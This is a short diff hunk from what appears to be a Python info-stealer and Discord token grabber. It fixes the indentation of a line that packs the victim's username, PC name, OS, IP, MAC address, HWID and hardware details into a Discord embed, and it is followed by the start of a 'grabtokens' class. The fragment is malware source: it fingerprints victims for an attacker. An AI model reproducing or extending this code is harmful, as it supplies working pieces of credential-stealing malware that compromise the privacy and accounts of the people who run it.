@@ -81,7 +81,7 @@ def get_inf():
     ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                 0].TotalVisibleMemorySize) / 1048576, 0)
 
-embed.add_field(name="SYSTEM INFO", value=f'''```yaml
+    embed.add_field(name="SYSTEM INFO", value=f'''```yaml
 PC Username: {pc_username}\nPC Name: {pc_name}\nOS: {computer_os}\n\nIP: {ip_address}\nMAC: {mac_address}\nHWID: {hwid}CPU: {cpu.Name}\nGPU: {gpu.Name}\nRAM: {ram}GB```''', inline=False)
 
 class grabtokens():
